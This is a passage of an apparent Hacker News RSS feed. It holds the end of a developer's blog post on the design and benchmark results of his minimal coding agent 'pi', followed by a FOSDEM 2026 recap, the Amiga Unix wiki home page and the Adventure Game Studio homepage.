    &lt;p&gt;If you look at the security measures in other coding agents, they're mostly security theater. As soon as your agent can write code and run code, it's pretty much game over. The only way you could prevent exfiltration of data would be to cut off all network access for the execution environment the agent runs in, which makes the agent mostly useless. An alternative is allow-listing domains, but this can also be worked around through other means.&lt;/p&gt;
    &lt;p&gt;Simon Willison has written extensively about this problem. His "dual LLM" pattern attempts to address confused deputy attacks and data exfiltration, but even he admits "this solution is pretty bad" and introduces enormous implementation complexity. The core issue remains: if an LLM has access to tools that can read private data and make network requests, you're playing whack-a-mole with attack vectors.&lt;/p&gt;
    &lt;p&gt;Since we cannot solve this trifecta of capabilities (read data, execute code, network access), pi just gives in. Everybody is running in YOLO mode anyways to get any productive work done, so why not make it the default and only option?&lt;/p&gt;
    &lt;p&gt;By default, pi has no web search or fetch tool. However, it can use &lt;code&gt;curl&lt;/code&gt; or read files from disk, both of which provide ample surface area for prompt injection attacks. Malicious content in files or command outputs can influence behavior. If you're uncomfortable with full access, run pi inside a container or use a different tool if you need (faux) guardrails.&lt;/p&gt;
    &lt;head rend="h3"&gt;No built-in to-dos&lt;/head&gt;
    &lt;p&gt;pi does not and will not support built-in to-dos. In my experience, to-do lists generally confuse models more than they help. They add state that the model has to track and update, which introduces more opportunities for things to go wrong.&lt;/p&gt;
    &lt;p&gt;If you need task tracking, make it externally stateful by writing to a file:&lt;/p&gt;
    &lt;code&gt;# TODO.md

- [x] Implement user authentication
- [x] Add database migrations
- [ ] Write API documentation
- [ ] Add rate limiting
&lt;/code&gt;
    &lt;p&gt;The agent can read and update this file as needed. Using checkboxes keeps track of what's done and what remains. Simple, visible, and under your control.&lt;/p&gt;
    &lt;head rend="h3"&gt;No plan mode&lt;/head&gt;
    &lt;p&gt;pi does not and will not have a built-in plan mode. Telling the agent to think through a problem together with you, without modifying files or executing commands, is generally sufficient.&lt;/p&gt;
    &lt;p&gt;If you need persistent planning across sessions, write it to a file:&lt;/p&gt;
    &lt;code&gt;# PLAN.md

## Goal
Refactor authentication system to support OAuth

## Approach
1. Research OAuth 2.0 flows
2. Design token storage schema
3. Implement authorization server endpoints
4. Update client-side login flow
5. Add tests

## Current Step
Working on step 3 - authorization endpoints
&lt;/code&gt;
    &lt;p&gt;The agent can read, update, and reference the plan as it works. Unlike ephemeral planning modes that only exist within a session, file-based plans can be shared across sessions, and can be versioned with your code.&lt;/p&gt;
    &lt;p&gt;Funnily enough, Claude Code now has a Plan Mode that's essentially read-only analysis, and it will eventually write a markdown file to disk. And you can basically not use plan mode without approving a shit ton of command invocations, because without that, planning is basically impossible.&lt;/p&gt;
    &lt;p&gt;The difference with pi is that I have full observability of everything. I get to see which sources the agent actually looked at and which ones it totally missed. In Claude Code, the orchestrating Claude instance usually spawns a sub-agent and you have zero visibility into what that sub-agent does. I get to see the markdown file immediately. I can edit it collaboratively with the agent. In short, I need observability for planning and I don't get that with Claude Code's plan mode.&lt;/p&gt;
    &lt;p&gt;If you must restrict the agent during planning, you can specify which tools it has access to via the CLI:&lt;/p&gt;
    &lt;code&gt;pi --tools read,grep,find,ls
&lt;/code&gt;
    &lt;p&gt;This gives you read-only mode for exploration and planning without the agent modifying anything or being able to run bash commands. You won't be happy with that though.&lt;/p&gt;
    &lt;head rend="h3"&gt;No MCP support&lt;/head&gt;
    &lt;p&gt;pi does not and will not support MCP. I've written about this extensively, but the TL;DR is: MCP servers are overkill for most use cases, and they come with significant context overhead.&lt;/p&gt;
    &lt;p&gt;Popular MCP servers like Playwright MCP (21 tools, 13.7k tokens) or Chrome DevTools MCP (26 tools, 18k tokens) dump their entire tool descriptions into your context on every session. That's 7-9% of your context window gone before you even start working. Many of these tools you'll never use in a given session.&lt;/p&gt;
    &lt;p&gt;The alternative is simple: build CLI tools with README files. The agent reads the README when it needs the tool, pays the token cost only when necessary (progressive disclosure), and can use bash to invoke the tool. This approach is composable (pipe outputs, chain commands), easy to extend (just add another script), and token-efficient.&lt;/p&gt;
    &lt;p&gt;Here's how I add web search to pi:&lt;/p&gt;
    &lt;p&gt;I maintain a collection of these tools at github.com/badlogic/agent-tools. Each tool is a simple CLI with a README that the agent reads on demand.&lt;/p&gt;
    &lt;p&gt;If you absolutely must use MCP servers, look into Peter Steinberger's mcporter tool that wraps MCP servers as CLI tools.&lt;/p&gt;
    &lt;head rend="h3"&gt;No background bash&lt;/head&gt;
    &lt;p&gt;pi's bash tool runs commands synchronously. There's no built-in way to start a dev server, run tests in the background, or interact with a REPL while the command is still running.&lt;/p&gt;
    &lt;p&gt;This is intentional. Background process management adds complexity: you need process tracking, output buffering, cleanup on exit, and ways to send input to running processes. Claude Code handles some of this with their background bash feature, but it has poor observability (a common theme with Claude Code) and forces the agent to track running instances without providing a tool to query them. In earlier Claude Code versions, the agent forgot about all its background processes after context compaction and had no way to query them, so you had to manually kill them. This has since been fixed.&lt;/p&gt;
    &lt;p&gt;Use tmux instead. Here's pi debugging a crashing C program in LLDB:&lt;/p&gt;
    &lt;p&gt;How's that for observability? The same approach works for long-running dev servers, watching log output, and similar use cases. And if you wanted to, you could hop into that LLDB session above via tmux and co-debug with the agent. Tmux also gives you a CLI argument to list all active sessions. How nice.&lt;/p&gt;
    &lt;p&gt;There's simply no need for background bash. Claude Code can use tmux too, you know. Bash is all you need.&lt;/p&gt;
    &lt;head rend="h3"&gt;No sub-agents&lt;/head&gt;
    &lt;p&gt;pi does not have a dedicated sub-agent tool. When Claude Code needs to do something complex, it often spawns a sub-agent to handle part of the task. You have zero visibility into what that sub-agent does. It's a black box within a black box. Context transfer between agents is also poor. The orchestrating agent decides what initial context to pass to the sub-agent, and you generally have little control over that. If the sub-agent makes a mistake, debugging is painful because you can't see the full conversation.&lt;/p&gt;
    &lt;p&gt;If you need pi to spawn itself, just ask it to run itself via bash. You could even have it spawn itself inside a tmux session for full observability and the ability to interact with that sub-agent directly.&lt;/p&gt;
    &lt;p&gt;But more importantly: fix your workflow, at least the ones that are all about context gathering. People use sub-agents within a session thinking they're saving context space, which is true. But that's the wrong way to think about sub-agents. Using a sub-agent mid-session for context gathering is a sign you didn't plan ahead. If you need to gather context, do that first in its own session. Create an artifact that you can later use in a fresh session to give your agent all the context it needs without polluting its context window with tool outputs. That artifact can be useful for the next feature too, and you get full observability and steerability, which is important during context gathering.&lt;/p&gt;
    &lt;p&gt;Because despite popular belief, models are still poor at finding all the context needed for implementing a new feature or fixing a bug. I attribute this to models being trained to only read parts of files rather than full files, so they're hesitant to read everything. Which means they miss important context and can't see what they need to properly complete the task.&lt;/p&gt;
    &lt;p&gt;Just look at the pi-mono issue tracker and the pull requests. Many get closed or revised because the agents couldn't fully grasp what's needed. That's not the fault of the contributors, which I truly appreciate because even incomplete PRs help me move faster. It just means we trust our agents too much.&lt;/p&gt;
    &lt;p&gt;I'm not dismissing sub-agents entirely. There are valid use cases. My most common one is code review: I tell pi to spawn itself with a code review prompt (via a custom slash command) and it gets the outputs.&lt;/p&gt;
    &lt;code&gt;---
description: Run a code review sub-agent
---
Spawn yourself as a sub-agent via bash to do a code review: $@

Use `pi --print` with appropriate arguments. If the user specifies a model,
use `--provider` and `--model` accordingly.

Pass a prompt to the sub-agent asking it to review the code for:
- Bugs and logic errors
- Security issues
- Error handling gaps

Do not read the code yourself. Let the sub-agent do that.

Report the sub-agent's findings.
&lt;/code&gt;
    &lt;p&gt;And here's how I use this to review a pull request on GitHub:&lt;/p&gt;
    &lt;p&gt;With a simple prompt, I can select what specific thing I want to review and what model to use. I could even set thinking levels if I wanted to. I can also save out the full review session to a file and hop into that in another pi session if I wanted. Or I can say this is an ephemeral session and it shouldn't be saved to disk. All of that gets translated into a prompt that the main agent reads and based on which it executes itself again via bash. And while I don't get full observability into the inner workings of the sub-agent, I get full observability on its output. Something other harnesses don't really provide, which makes no sense to me.&lt;/p&gt;
    &lt;p&gt;Of course, this is a bit of a simulated use case. In reality, I would just spawn a new pi session and ask it to review the pull request, possibly pull it into a branch locally. After I see its initial review, I give my own review and then we work on it together until it's good. That's the workflow I use to not merge garbage code.&lt;/p&gt;
    &lt;p&gt;Spawning multiple sub-agents to implement various features in parallel is an anti-pattern in my book and doesn't work, unless you don't care if your codebase devolves into a pile of garbage.&lt;/p&gt;
    &lt;head rend="h2"&gt;Benchmarks&lt;/head&gt;
    &lt;p&gt;I make a lot of grandiose claims, but do I have numerical proof that all the contrarian things I say above actually work? I have my lived experience, but that's hard to transport in a blog post and you'd just have to believe me. So I created a Terminal-Bench 2.0 test run for pi with Claude Opus 4.5 and let it compete against Codex, Cursor, Windsurf, and other coding harnesses with their respective native models. Obviously, we all know benchmarks aren't representative of real-world performance, but it's the best I can provide you as a sort of proof that not everything I say is complete bullshit.&lt;/p&gt;
    &lt;p&gt;I performed a complete run with five trials per task, which makes the results eligible for submission to the leaderboard. I also started a second run that only runs during CET because I found that error rates (and consequently benchmark results) get worse once PST goes online. Here are the results for the first run:&lt;/p&gt;
    &lt;p&gt;And here's pi's placement on the current leaderboard as of December 2nd, 2025:&lt;/p&gt;
    &lt;p&gt;And here's the results.json file I've submitted to the Terminal-Bench folks for inclusion in the leaderboard. The bench runner for pi can be found in this repository if you want to reproduce the results. I suggest you use your Claude plan instead of pay-as-you-go.&lt;/p&gt;
    &lt;p&gt;Finally, here's a little glimpse into the CET-only run:&lt;/p&gt;
    &lt;p&gt;This is going to take another day or so to complete. I will update this blog post once that is done.&lt;/p&gt;
    &lt;p&gt;Also note the ranking of Terminus 2 on the leaderboard. Terminus 2 is the Terminal-Bench team's own minimal agent that just gives the model a tmux session. The model sends commands as text to tmux and parses the terminal output itself. No fancy tools, no file operations, just raw terminal interaction. And it's holding its own against agents with far more sophisticated tooling and works with a diverse set of models. More evidence that a minimal approach can do just as well.&lt;/p&gt;
    &lt;head rend="h2"&gt;In summary&lt;/head&gt;
    &lt;p&gt;Benchmark results are hilarious, but the real proof is in the pudding. And my pudding is my day-to-day work, where pi has been performing admirably. Twitter is full of context engineering posts and blogs, but I feel like none of the harnesses we currently have actually let you do context engineering. pi is my attempt to build myself a tool where I'm in control as much as possible.&lt;/p&gt;
    &lt;p&gt;I'm pretty happy with where pi is. There are a few more features I'd like to add, like compaction or tool result streaming, but I don't think there's much more I'll personally need. Missing compaction hasn't been a problem for me personally. For some reason, I'm able to cram hundreds of exchanges between me and the agent into a single session, which I couldn't do with Claude Code without compaction.&lt;/p&gt;
    &lt;p&gt;That said, I welcome contributions. But as with all my open source projects, I tend to be dictatorial. A lesson I've learned the hard way over the years with my bigger projects. If I close an issue or PR you've sent in, I hope there are no hard feelings. I will also do my best to give you reasons why. I just want to keep this focused and maintainable. If pi doesn't fit your needs, I implore you to fork it. I truly mean it. And if you create something that even better fits my needs, I'll happily join your efforts.&lt;/p&gt;
    &lt;p&gt;I think some of the learnings above transfer to other harnesses as well. Let me know how that goes for you.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46844822</guid><pubDate>Sun, 01 Feb 2026 09:33:46 +0000</pubDate></item><item><title>Netbird – Open Source Zero Trust Networking</title><link>https://netbird.io/</link><guid isPermaLink="false">https://news.ycombinator.com/item?id=46844870</guid><pubDate>Sun, 01 Feb 2026 09:44:01 +0000</pubDate></item><item><title>FOSDEM 2026 – Open-Source Conference in Brussels – Day#1 Recap</title><link>https://gyptazy.com/blog/fosdem-2026-opensource-conference-brussels/</link><description>&lt;doc fingerprint="3fc5121dabaf457a"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;FOSDEM 2026 – Open Source, Digital Sovereignty, and Europes Future&lt;/head&gt;():&lt;p&gt;FOSDEM, the Free and Open Source Developers’ European Meeting, is an annual pilgrimage for open source enthusiasts from all over the world. What started as a small gathering in 2000, originally named the Open Source Developers of Europe Meeting (OSDEM), has grown into one of the most significant conferences dedicated to free and open source software.&lt;/p&gt;&lt;p&gt;In 2026, FOSDEM felt more purposeful than ever. The conference clearly reflected a growing awareness around digital sovereignty and Europe’s technological future.&lt;/p&gt;&lt;p&gt;Self hosted solutions, open infrastructure, and community driven software were no longer niche topics. They were central to many discussions and presentations. The focus has visibly shifted away from convenience first and centralized platforms and toward systems that put control, transparency, and resilience back into the hands of users and communities. This shift was ily supported by established communities such as the FreeBSD project, which continues to demonstrate how long term, openly governed systems can serve as reliable foundations for sovereign infrastructure. At the same time, smaller but equally important projects showed how grassroots innovation drives real change. Talks like Hyacinthe’s FlipFlap presentation on the DN42 network highlighted decentralized and community operated networking in practice, while Emile’s talk on SmolBSD demonstrated how minimal, purpose built BSD systems can bring clarity, auditability, and long term maintainability back to operating system design. Projects such as BoxyBSD, crafted by gyptazy, showcased how lowering the barrier to learning BSD based systems empowers the next generation of open source contributors. By providing free invite codes during FOSDEM, BoxyBSD made hands on experimentation immediately accessible and reinforced the conference’s spirit of openness and community support.&lt;/p&gt;&lt;p&gt;FOSDEM 2026 made one thing unmistakably clear. Open source is no longer just about software freedom. It is increasingly about independence, sustainability, and Europe’s ability to shape its own digital future.&lt;/p&gt;&lt;head rend="h2"&gt;Arrival at FOSDEM 2026&lt;/head&gt;&lt;p&gt;Like every year, I decided to travel to FOSDEM by car. It’s actually the most relaxed way for me to get there as I can simply drive at any time in the morning, but it comes with one clear disadvantage: you have to arrive very early to secure a parking spot directly on campus. That means starting the journey long before the city fully wakes up. Overall, the travel time is more or less the same as taking the train, so that part doesn’t really matter. What does matter is the flexibility and being able to move around freely and head back home whenever I want. Since I usually only attend the first day of FOSDEM, that flexibility makes the early start worth it.&lt;/p&gt;&lt;p&gt;This year, the effort paid off once again. I ended up being the first car in line at the gate leading to the parking area. Better safe than sorry. Anyone who has attended FOSDEM knows that parking nearby is a small victory that can shape the rest of the day.&lt;/p&gt;&lt;p&gt;After parking, there was time to slow down a bit. Before the talks began, the campus gradually filled with familiar faces. FOSDEM has a unique rhythm in the early morning hours, when everything is still calm and conversations happen without rushing from room to room.&lt;/p&gt;&lt;p&gt;I met up with a few friends, and we took the opportunity to catch up and exchange a few thoughts before the day properly started. With coffees and croissants in hand, we waited for the opening talk. It was a simple moment, but one that perfectly captured the atmosphere of FOSDEM: a mix of anticipation, community, and shared curiosity about what the weekend would bring.&lt;/p&gt;&lt;head rend="h2"&gt;My Talk-Schedule at FOSDEM 2026&lt;/head&gt;&lt;p&gt;My personal schedule at FOSDEM followed a clear thread: understanding infrastructure from the lowest layers up to real-world, community operated systems. Rather than chasing trends, I focused on talks that explored control, reliability, and long term sustainability.&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;Rust-VMM&lt;/item&gt;&lt;item&gt;Garage S3 Best Practices&lt;/item&gt;&lt;item&gt;Mobility of Virtual Machines in Kubernetes Clusters&lt;/item&gt;&lt;item&gt;SmolBSD&lt;/item&gt;&lt;item&gt;FlipFlap Network in DN42&lt;/item&gt;&lt;/list&gt;&lt;p&gt;The Rust-VMM talk set the tone by diving into modern virtualization foundations built with memory safety in mind. It highlighted how Rust enables a new generation of virtual machine monitors that reduce entire classes of bugs while still meeting strict performance requirements. For anyone working close to hardware or hypervisors, it was a i argument for rethinking traditional systems programming choices.&lt;/p&gt;&lt;p&gt;With Garage S3 Best Practices, the focus shifted from design to day-to-day operations. Object storage is often treated as a commodity, yet the talk made it clear how many subtle challenges exist around consistency, failure handling, and scaling. Real operational lessons and practical advice emphasized that running storage reliably is just as important as building it.&lt;/p&gt;&lt;p&gt;The talk on Mobility of Virtual Machines in Kubernetes Clusters explored the increasingly blurred line between classical virtualization and container orchestration. It showed how virtual machines can move and adapt within Kubernetes environments, combining the i isolation of VMs with the flexibility of cloud native tooling. This hybrid approach challenges the idea that platforms must choose one model exclusively.&lt;/p&gt;&lt;p&gt;SmolBSD brought a refreshing focus on minimalism. Instead of adding more layers, the project embraces small, understandable systems that are easier to audit and maintain over time. The talk reinforced the idea that simplicity is not a limitation but a strategic choice, especially for long lived infrastructure.&lt;/p&gt;&lt;p&gt;Finally, FlipFlap Network in DN42 connected many of the earlier themes through a community perspective. DN42 demonstrates how decentralized, self operated networking can work in practice. The talk showcased automation, experimentation, and cooperation in a real network built by its users, highlighting the educational and innovative power of grassroots infrastructure.&lt;/p&gt;&lt;p&gt;Together, these talks formed a coherent journey through modern open infrastructure: from safe low level building blocks to resilient storage, hybrid orchestration models, minimal operating systems, and community driven networks.&lt;/p&gt;&lt;head rend="h2"&gt;Best of...&lt;/head&gt;&lt;p&gt;One of my personal highlights of FOSDEM 2026 was a wonderfully simple yet brilliant idea by the Mozilla Foundation: giving away free cookies. It turned out to be more than just snacks. It was a fun little game, a great conversation starter, and the selection of cookies was genuinely excellent. You might have come for open source, but you probably left liking cookies even more than before.&lt;/p&gt;&lt;p&gt;Another standout moment was the talk The Challenges of FLOSS Office Suites by Michael Meeks, where he dove into the technical details behind Collabora Online. It was an absolute pleasure to listen to. What made the talk special was not only the depth of technical insight, but also the way it was presented. Complex topics were explained clearly, with context and humor, making it accessible without oversimplifying.&lt;/p&gt;&lt;p&gt;I was genuinely amazed by how the challenges of building and maintaining a full-featured, open source office suite were laid out so honestly. The talk went far beyond architecture diagrams and performance considerations and gave real insight into the long-term effort required to keep such critical software alive and competitive.&lt;/p&gt;&lt;p&gt;Beyond the talks, I also took the opportunity to have some great conversations at the booths. I chatted with fixoulab at the Proxmox booth and with the XCP-ng team at Vates, where I got an early look at the newly released Orchestra features. It was especially interesting since I had not yet found the time to dive into them in detail.&lt;/p&gt;&lt;p&gt;On a more personal note, I was truly grateful to meet many of my friends from different countries again. Being able to jump into great talks together, exchange impressions on the spot, and continue discussions afterwards is something that makes FOSDEM special in a way no recording or live stream ever could.&lt;/p&gt;&lt;head rend="h2"&gt;What the heck is going on at the FOSDEM 2026?&lt;/head&gt;&lt;p&gt;FOSDEM has always been crowded. Anyone who has attended more than once knows the familiar experience of packed hallways, full lecture rooms, and sprinting between buildings in the hope of catching the last five minutes of a talk. As the biggest open source conference in the world, this has long been part of its identity. But in 2026, it felt like something had shifted.&lt;/p&gt;&lt;p&gt;There is no doubt that the growing interest in free and open source software is a good thing. More people take open source seriously, more organizations depend on it, and more contributors want to get involved. That energy was clearly visible everywhere. At the same time, it felt like FOSDEM was reaching — or perhaps exceeding — its natural limits. Rooms filled faster than ever, informal discussions became harder to have, and the sheer density of people sometimes worked against the very openness the conference is known for.&lt;/p&gt;&lt;p&gt;A major driver behind this growth is the current political and economic climate. Topics like digital sovereignty, technological independence, and reducing reliance on a small number of dominant market players were more present than ever. This was not subtle. It was visible across the schedule, in hallway conversations, and especially during the Friday pre-conferences, where these themes were actively pursued and debated.&lt;/p&gt;&lt;p&gt;On one hand, this focus is both necessary and overdue. Open source has always been political in the sense that it is about control, transparency, and autonomy, even when it pretended not to be. Seeing these discussions move to the center stage at FOSDEM is encouraging. It shows that the community understands the stakes and is willing to engage with the broader implications of the technology it builds.&lt;/p&gt;&lt;p&gt;On the other hand, the intensity of this shift raises uncomfortable questions. When everything becomes urgent and strategic, the space for experimentation, learning, and smaller niche projects risks being squeezed out. Not every open source project exists to solve geopolitical problems, and not every contributor arrives with a policy agenda. FOSDEM has always thrived on its diversity of motivations, and maintaining that balance will be increasingly challenging.&lt;/p&gt;&lt;p&gt;FOSDEM 2026 felt like a conference at a crossroads. Its success is undeniable, but so are the growing pains that come with it. The challenge for the coming years will be finding ways to scale without losing what made the event special in the first place: accessibility, spontaneity, and the feeling that there is room for everyone and not just for the loudest or most timely topics. And while I already criticized this last year, this becomes even more important this year.&lt;/p&gt;&lt;p&gt;The conversations happening now are important, and it is good that they are happening at FOSDEM. But if the conference is to remain sustainable, both logistically and culturally, it will need to evolve just as thoughtfully as the open source ecosystem it represents.&lt;/p&gt;&lt;head rend="h2"&gt;Final Thoughts&lt;/head&gt;&lt;p&gt;It is genuinely great to see that FOSDEM remains free and open to everyone, even as the topics it covers become more complex and more relevant. The growing focus on moving away from big tech and reclaiming ownership of our data shows that the community is paying attention to what truly matters. These discussions are necessary, and it is encouraging to see them reflected so clearly in the talks and hallway conversations.&lt;/p&gt;&lt;p&gt;The quality of the talks was high, and the people were, as always, amazing. FOSDEM continues to be a place where curiosity, expertise, and openness meet. At the same time, the question of scale can no longer be ignored. Camping in front of a single room just to make sure you can attend a talk is not a sustainable solution. In many cases, it may even discourage the people who are genuinely interested but cannot afford to wait for hours or navigate overcrowded spaces.&lt;/p&gt;&lt;p&gt;For exactly this reason, I seriously considered staying home this year and watching the talks via live streams or recordings. From a purely technical perspective, that would have worked just fine. The content would still be there, accessible and well produced.&lt;/p&gt;&lt;p&gt;But in the end, FOSDEM is not just about talks. It is about meeting people, reconnecting with friends, and having spontaneous conversations that no video stream can fully replace. Seeing all of you again, sharing thoughts over coffee, and exchanging ideas in person ultimately mattered more than comfort or convenience.&lt;/p&gt;&lt;p&gt;FOSDEM 2026 once again proved why this conference is special. The challenge now is to ensure that it can continue to grow without losing the openness and accessibility that define it. That balance will shape what FOSDEM becomes in the years to come.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46845103</guid><pubDate>Sun, 01 Feb 2026 10:30:41 +0000</pubDate></item><item><title>Amiga Unix (Amix)</title><link>https://www.amigaunix.com/doku.php/home</link><description>&lt;doc fingerprint="a7a29c0e5929259e"&gt;
  &lt;main&gt;
    &lt;p&gt;Welcome to the Amiga Unix wiki!&lt;/p&gt;
    &lt;p&gt;Amiga UNIX (also known as “Amix”) was Commodore's port of AT&amp;amp;T System V Release 4 Unix to the Amiga in 1990. Like many early Unix variants, Amiga Unix never became wildly popular, but it is an interesting sidestep in the history of the Amiga.&lt;/p&gt;
    &lt;p&gt;The two “official” machines that could run Amix were the Amiga 2500UX and 3000UX models, however it can run on any Amiga that meets its hardware requirements. The awesome Amiga emulator WinUAE has been able to run it since 2013 (version 2.7.0 onwards).&lt;/p&gt;
    &lt;p&gt;This site is dedicated on preserving Amix's history and sharing information and instructions on what Amix is, how to install it (either on real hardware or in emulation) and what can you do with it. Mainly, it tries to cater to people who wish to run AMIX for whatever reason on their hardware. By documenting experiences with it, it is hoped that subsequent SVR4 junkies will find the way more smooth than it might have been without any guidance at all. For even a relatively experienced modern Unix or GNU/Linux administrator, System V UNIX is sufficiently different to present difficulty in installation and administration. Not so much in moving around between directories, and using common utilities that persist to this day - although many of those are hoary and somewhat forgetful in their retirement - but of doing more in depth tasks and understanding the differences.&lt;/p&gt;
    &lt;head rend="h1"&gt;Table of contents&lt;/head&gt;
    &lt;p&gt;&lt;lb/&gt; Amiga 3000UX Advert (thanks to 1000bit.it!) &lt;/p&gt;
    &lt;head rend="h3"&gt;History and Documentation&lt;/head&gt;
    &lt;head rend="h3"&gt;Hardware&lt;/head&gt;
    &lt;head rend="h3"&gt;Tutorials &amp;amp; How-to's&lt;/head&gt;
    &lt;head rend="h3"&gt;Software&lt;/head&gt;
    &lt;head rend="h3"&gt;General topics&lt;/head&gt;
    &lt;head rend="h3"&gt;Links&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;STREAM: Commodore Had UNIX On Amiga?! by NCommander on YouTube (1.5.2022)&lt;/item&gt;
      &lt;item&gt;"Abysmal AMIX Performance" and other blog posts about Amix and its disk performance in bdwheele's blog&lt;/item&gt;
      &lt;item&gt;Article about Amix in “Virtually Fun” blog: AMIX (2013).&lt;/item&gt;
      &lt;item&gt;WinUAE and the beginnings of Amix support in EAB forums&lt;/item&gt;
      &lt;item&gt;Great Amix site with re-done manuals and other useful files (in german): http://www.amigaunix.de&lt;/item&gt;
      &lt;item&gt;Telefisk.org gopher site mirror to grab files: http://gopher.muffinlabs.com/telefisk.org/amiga/Amix/&lt;/item&gt;
      &lt;item&gt;Not that active anymore, but still a good reading: Amiga UNIX Discussions in Amiga.org&lt;/item&gt;
      &lt;item&gt;Old, and riddled with Spam, but there once was a thriving Newsgroup dedicated to Amiga Unix. Seeing the Internet “never forgets”, you can find the old discussions at Google Groups: https://groups.google.com/forum/#!forum/comp.unix.amiga&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Where to get help with Amix?&lt;/p&gt;
    &lt;p&gt;Currently the most active Amix-related forum seems to be support.Amix @ English Amiga Board. Ask there if you need any help!&lt;/p&gt;
    &lt;p&gt;Wanted: content for this site! Do you have a piece of third-party software for Amix? Copy of an exotic hardware driver? Would you like to help write guides? Have copy of files from litamiga.epfl.ch or amiga.physik.unizh.ch? Please let us know!&lt;/p&gt;
    &lt;p&gt;Why would you like to try Amix? The short answer is, you don't want it. Stay with me for just a minute here.&lt;/p&gt;
    &lt;p&gt;Amiga UNIX is really, really real UNIX. AT&amp;amp;T System V Release 4, ported by a team at Commodore that quit the day that 1.0 was released - at least, as legend has it. All the releases have their share of issues, and none of them have been updated in well over a decade. It runs on old hardware that was expensive when new and hard enough to find now that “RARE!” tags on eBay aren't hyperbole for once. You can cheat and get it installed without the tape drive, at least, but it's not for the faint of heart and has its own caveats such as a completely broken package system.&lt;/p&gt;
    &lt;p&gt;Think for a minute about your goals before embarking on this journey. If you're a die-hard Amiga user - and we all know they are still out there - interested in trying this UNIX thing, because you've heard about Mac OS X and that's based on UNIX, but before you swap out Kickstart for init you'd like to kick the tires on Amiga UNIX…&lt;/p&gt;
    &lt;p&gt;Don't.&lt;/p&gt;
    &lt;p&gt;Ten minutes with Amiga UNIX will have some Amiga users reaching for their 3.1 floppies. Actually, two minutes with the installer might have the same effect. That's just not fair to UNIX, whether it's GNU/Linux, Solaris, FreeBSD, or whatever. The environment has come a long way in the years and years since Amiga UNIX was shiny and new, rather than bitter and tarnished. Your average Ubuntu user will have set fire to their house trying to expunge any evidence of the unforgiving AMIX installation. Did I mention it hasn't been updated in a decade? Put your Amiga UNIX machine on the net with no firewall and you may see it rooted faster than a Win98SE box running IE5.&lt;/p&gt;
    &lt;p&gt;Finally, and this is a biggie, there is no future for AMIX. Its kernel, libc, and much of its software is closed source, so when Commodore folded its story was over. It was put to pasture even as free UNIX environments began to be truly plausible contenders for commercial UNIX, and largely forgotten.&lt;/p&gt;
    &lt;p&gt;So this is quite the happy page, isn't it? Why would you want to install AMIX?&lt;/p&gt;
    &lt;p&gt;There's really only one reason. Well, two, if you count being an idiot like us. That reason is simple curiosity. If you'd like to put yourself in the shoes of an aspiring systems programmer in the early nineties, go for it. If you find the legacy of the ever growing open source operating system revolution fascinating, AMIX could prove instructive. If you're trying to impress bearded UNIX gurus with arcane knowledge from the times when men were men, and 16MB was a ton of RAM, the dwindling lore of System V might be the key. These days, Amiga UNIX is all about history and learning.&lt;/p&gt;
    &lt;p&gt;So if you have the requisite hardware and you have girded yourself for what is in store for you should you venture into the m68k-cbm-sysv4 dungeon, you might enjoy this site and the dusty treasures it contains. But seriously, if you just want to try UNIX or GNU/Linux out, the most expedient way to do it is on x86 or just something better supported on Amiga hardware. There are lots of choices for you.&lt;/p&gt;
    &lt;p&gt;Good luck, and enjoy!&lt;/p&gt;
    &lt;head rend="h2"&gt;Acknowledgements&lt;/head&gt;
    &lt;p&gt;Thanks to Folkert “Tahoe” de Gans for hosting the site!&lt;/p&gt;
    &lt;p&gt;Thanks to Ville Laustela for images &amp;amp; scans and updating the Wiki.&lt;/p&gt;
    &lt;p&gt;Thanks to Toni Wilen for maintaining the WinUAE emulator and making it possible to run Amix inside it.&lt;/p&gt;
    &lt;p&gt;Dedicated to Andrew “Failsure” Whitlock, the original creator and maintainer of this site. RIP, agw.&lt;/p&gt;
    &lt;p&gt; 19505 visitors since 1.8.2019 &lt;/p&gt;
    &lt;p&gt;To contact us, please use the contact form.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46845244</guid><pubDate>Sun, 01 Feb 2026 10:57:20 +0000</pubDate></item><item><title>Adventure Game Studio: OSS software for creating adventure games</title><link>https://www.adventuregamestudio.co.uk/</link><description>&lt;doc fingerprint="8f0035ddd9d7e9e8"&gt;
  &lt;main&gt;
    &lt;p&gt;Adventure Game Studio (AGS) is open-source software for creating graphical point-and-click adventure games. It is free, standalone, and requires no subscription.&lt;/p&gt;
    &lt;p&gt;The Windows-based IDE, streamlines game creation by integrating tools for importing graphics, writing scripts, and testing. Games created with AGS can be played on multiple platforms, including Linux, iOS, and Android.&lt;/p&gt;
    &lt;p&gt;Suitable for all skill levels, AGS features an active community for support and socialising.&lt;/p&gt;
    &lt;p&gt;Showcase your games by uploading them to this website.&lt;/p&gt;
    &lt;p&gt;Rot your brain by consuming AI slop and services in this classic arcade style game created for the MAGS January 2026 game jam in the AGS forums.Move […]&lt;/p&gt;
    &lt;p&gt;You awaken alone on a cold, rocky shore beneath a moonless sky, dragged from the sea through a sewer pipe with no memory of who you are, how you […]&lt;/p&gt;
    &lt;p&gt;You play as detective Jake McUrk working for the Police Detective Agency. The citizens got rid of the old corrupt police system and organized the PDA,[…]&lt;/p&gt;
    &lt;p&gt;The black horse of war looms over the land, with the ominous Lord Ironcrow at the reins. Because Pib's apprenticeship makes him vulnerable to the […]&lt;/p&gt;
    &lt;p&gt; In: Beginners' Technical Questions&lt;lb/&gt; By: Crimson Wizard (1 hour ago) &lt;/p&gt;
    &lt;p&gt; In: Beginners' Technical Questions&lt;lb/&gt; By: SilverSpook (2 hours ago) &lt;/p&gt;
    &lt;p&gt; In: The Rumpus Room&lt;lb/&gt; By: cat (2 hours ago) &lt;/p&gt;
    &lt;p&gt; In: Beginners' Technical Questions&lt;lb/&gt; By: Crimson Wizard (3 hours ago) &lt;/p&gt;
    &lt;p&gt; In: The Rumpus Room&lt;lb/&gt; By: Danvzare (3 hours ago) &lt;/p&gt;
